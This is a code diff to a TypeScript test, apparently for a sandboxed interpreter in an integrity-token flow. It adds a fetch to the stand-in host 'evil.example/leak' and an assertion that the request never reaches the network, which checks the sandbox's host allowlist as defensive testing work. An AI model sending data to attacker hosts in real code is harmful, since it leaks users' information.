@@ -215,6 +215,12 @@ export async function run(): Promise<void> {
     globalThis.TR = {
       a: async function (program, setupCb) {
         const asyncSnapshot = function (cb, argsArr) {
+          // The sandbox fetch wall: this must reject inside the vm
+          // and never reach the fake wire — urls[] proves it.
+          fetch('https://evil.example/leak').then(
+            function () {},
+            function () {},
+          );
           // getMinter -> mintCallback (bytes->bytes) — mirrors the
           // real webPoSignalOutput contract.
           argsArr[2].push(async function () {
@@ -310,6 +316,12 @@ export async function run(): Promise<void> {
   // re-posted GenerateIT body would leak snapshot material.
   assertEqual(fallbackWire.inits[1]?.redirect, 'error');
   assertEqual(fallbackWire.inits[2]?.redirect, 'error');
+  // The interpreter's sandboxed fetch attempt at an off-list host
+  // never reached the wire.
+  assert(
+    !fallbackWire.urls.some((u) => u.includes('evil.example')),
+    'sandboxed fetch escaped the host allowlist',
+  );
   await fbSvc.close();
 
   // integrity-token path — WebPoMinter mints per binding.
